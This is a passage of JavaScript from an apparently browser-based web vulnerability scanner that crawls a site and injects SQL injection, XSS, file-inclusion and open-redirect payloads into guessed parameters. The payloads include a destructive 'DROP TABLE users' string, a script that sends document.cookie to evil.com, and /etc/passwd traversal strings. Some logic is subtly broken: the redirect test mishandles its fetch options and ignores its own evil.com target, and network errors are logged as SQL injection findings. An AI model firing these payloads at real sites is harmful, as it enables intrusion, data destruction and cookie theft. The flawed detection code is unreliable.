  // ----- Helpers -----
  function fetchUrl(target, timeout=TIMEOUT) {
    return new Promise((resolve, reject) => {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), timeout);
      fetch(target, {
        method: 'GET',
        headers: { 'User-Agent': 'VulnScanner-CSP/1.0' },
        signal: controller.signal,
        credentials: 'omit'
      })
      .then(res => { clearTimeout(timer); resolve(res); })
      .catch(err => { clearTimeout(timer); reject(err); });
    });
  }

  function extractLinks(html, base) {
    const doc = document.createElement('html');
    doc.innerHTML = html;
    const anchors = doc.querySelectorAll('a[href]');
    const links = new Set();
    for (const a of anchors) {
      let href = a.getAttribute('href');
      if (!href || href.startsWith('#') || href.startsWith('javascript:')) continue;
      try {
        const abs = new URL(href, base).href;
        if (abs.startsWith(baseOrigin) && !visited.has(abs)) {
          links.add(abs);
        }
      } catch (_) {}
    }
    return links;
  }

  function extractLazyResources(html, sourceUrl) {
    const doc = document.createElement('html');
    doc.innerHTML = html;
    const resources = [];
    const attrs = ['data-src', 'data-href', 'data-url', 'data-srcset', 'data-lazy', 'data-original', 'data-src-large'];
    const elements = doc.querySelectorAll('[' + attrs.join('],[') + ']');
    for (const el of elements) {
      for (const attr of attrs) {
        let val = el.getAttribute(attr);
        if (val) {
          let urls = val.split(',').map(s => s.trim().split(' ')[0]).filter(u => u.startsWith('http') || u.startsWith('/'));
          for (let url of urls) {
            try {
              const abs = new URL(url, sourceUrl).href;
              if (abs.startsWith(baseOrigin)) {
                resources.push({ lazyUrl: abs, attribute: attr, type: el.tagName });
              }
            } catch (_) {}
          }
        }
      }
    }
    return resources;
  }

  function extractFormsAndParams(html) {
    const doc = document.createElement('html');
    doc.innerHTML = html;
    const forms = doc.querySelectorAll('form');
    const params = new Set();
    for (const form of forms) {
      const inputs = form.querySelectorAll('input[name]');
      for (const inp of inputs) {
        params.add(inp.getAttribute('name'));
      }
    }
    return { forms: forms.length, params: Array.from(params) };
  }

  // ----- Vulnerability tests -----
  async function testSqli(url, param) {
    const payloads = ["'", '"', "1' OR '1'='1", "1' AND 1=1 --", "'; DROP TABLE users; --"];
    for (const payload of payloads) {
      const testUrl = new URL(url);
      testUrl.searchParams.set(param, payload);
      try {
        const start = Date.now();
        const resp = await fetchUrl(testUrl.href, 5000);
        const duration = Date.now() - start;
        const text = await resp.text();
        const lower = text.toLowerCase();
        const indicators = ['sql syntax','mysql','warning','unclosed quotation','odbc','driver','sqlstate','syntax error'];
        if (indicators.some(ind => lower.includes(ind)) || duration > 3000) {
          results.sqli.push({ url, param, payload, status: resp.status, indicator: 'anomaly' });
          return true;
        }
      } catch (_) {
        results.sqli.push({ url, param, payload, status: 'error', indicator: 'connection anomaly' });
        return true;
      }
    }
    return false;
  }

  async function testXss(url, param, cspWeak) {
    let payloads = [
      '<script>alert(1)</script>',
      '"><img src=x onerror=alert(1)>',
      '"><svg/onload=alert(1)>',
      'javascript:alert(1)'
    ];
    if (cspWeak) {
      payloads.push(
        '"><script>eval("alert(1)")</script>',
        '"><script>document.write("XSS")</script>',
        '"><script>fetch("//evil.com?cookie="+document.cookie)</script>'
      );
    }
    for (const payload of payloads) {
      const testUrl = new URL(url);
      testUrl.searchParams.set(param, payload);
      try {
        const resp = await fetchUrl(testUrl.href, 5000);
        const text = await resp.text();
        let reflected = false;
        for (const part of ['alert(1)', 'onerror=alert', 'javascript:', 'eval(', 'document.write', 'fetch']) {
          if (payload.includes(part) && text.includes(part)) {
            reflected = true;
            break;
          }
        }
        if (reflected) {
          results.xss.push({ url, param, payload, status: resp.status, indicator: 'reflected' });
          return true;
        }
      } catch (_) {}
    }
    return false;
  }

  async function testLfi(url, param) {
    const payloads = [
      '../../../../etc/passwd',
      '..\\..\\..\\..\\windows\\win.ini',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd'
    ];
    for (const payload of payloads) {
      const testUrl = new URL(url);
      testUrl.searchParams.set(param, payload);
      try {
        const resp = await fetchUrl(testUrl.href, 5000);
        const text = await resp.text();
        const indicators = ['root:', 'boot loader', '[extensions]', 'mysql', 'passwd'];
        if (indicators.some(ind => text.includes(ind))) {
          results.lfi.push({ url, param, payload, status: resp.status, indicator: 'file content' });
          return true;
        }
      } catch (_) {}
    }
    return false;
  }

  async function testOpenRedirect(url, param) {
    const payloads = [
      '//evil.com',
      'http://evil.com',
      'https://evil.com',
      '//google.com'
    ];
    for (const payload of payloads) {
      const testUrl = new URL(url);
      testUrl.searchParams.set(param, payload);
      try {
        const resp = await fetchUrl(testUrl.href, { timeout: 3000, redirect: 'manual' });
        const location = resp.headers.get('location');
        if (location) {
          try {
            const locUrl = new URL(location, testUrl.href);
            if (locUrl.origin !== baseOrigin && locUrl.hostname !== 'evil.com') {
              results.openRedirects.push({ url, param, payload, redirectUrl: location });
              return true;
            }
          } catch (_) {}
        }
      } catch (_) {}
    }
    return false;
  }

  // ----- CSP analysis -----
  function analyzeCSP(headerValue) {
    if (!headerValue) return { present: false, weak: false, issues: ['Missing CSP'] };
    const issues = [];
    if (headerValue.includes("unsafe-inline")) issues.push("unsafe-inline allowed");
    if (headerValue.includes("unsafe-eval")) issues.push("unsafe-eval allowed");
    if (!headerValue.includes("default-src")) issues.push("default-src not set");
    return { present: true, weak: issues.length > 0, issues };
  }

  // ----- Scan a single page -----
  async function scanPage(url, depth) {
    if (visited.has(url)) return;
    visited.add(url);
    totalPages++;
    try {
      const resp = await fetchUrl(url, 10000);
      const status = resp.status;
      const headers = resp.headers;
      const html = await resp.text();

      results.pages.push({ url, status, headers: Object.fromEntries(headers.entries()) });

      // CSP
      const cspHeader = headers.get('content-security-policy');
      const cspInfo = analyzeCSP(cspHeader);
      results.csp.push({ url, header: cspHeader || 'missing', weak: cspInfo.weak, issues: cspInfo.issues });
      const cspWeak = !cspInfo.present || cspInfo.weak;

      // Security headers (other than CSP)
      const critical = ['x-frame-options','x-content-type-options','strict-transport-security'];
      const missing = critical.filter(h => !headers.has(h));
      if (missing.length) {
        results.headers[url] = missing;
      }

      // Cookie security
      const setCookie = headers.get('set-cookie');
      if (setCookie) {
        const cookies = setCookie.split(',').map(c => c.trim());
        for (const cookie of cookies) {
          if (!cookie.toLowerCase().includes('httponly')) {
            results.cookieIssues.push({ url, cookie, issue: 'Missing HttpOnly' });
          }
          if (!cookie.toLowerCase().includes('secure')) {
            results.cookieIssues.push({ url, cookie, issue: 'Missing Secure' });
          }
        }
      }

      // Lazy resources
      const lazyResources = extractLazyResources(html, url);
      for (const res of lazyResources) {
        results.lazyResources.push({ sourceUrl: url, ...res });
        if (!visited.has(res.lazyUrl) && !queue.includes(res.lazyUrl)) {
          queue.push(res.lazyUrl);
        }
      }

      // Parameters
      const { params } = extractFormsAndParams(html);
      const allParams = new Set([...params, 'id','user','page','cat','product','q','s','lang','view','search','redirect','return','next','url','path']);

      for (const param of allParams) {
        await testSqli(url, param);
        await testXss(url, param, cspWeak);
        await testLfi(url, param);
        await testOpenRedirect(url, param);
      }

      // Crawl deeper
      if (depth < MAX_DEPTH && results.pages.length < MAX_PAGES) {
        const links = extractLinks(html, url);
        for (const link of links) {
          if (!visited.has(link) && !queue.includes(link)) {
            queue.push(link);
          }
        }
      }

      return { status, missing, csp: cspInfo };
    } catch (err) {
      results.pages.push({ url, status: 'error', error: err.message });
      return { status: 'error', error: err.message };
    }
  }

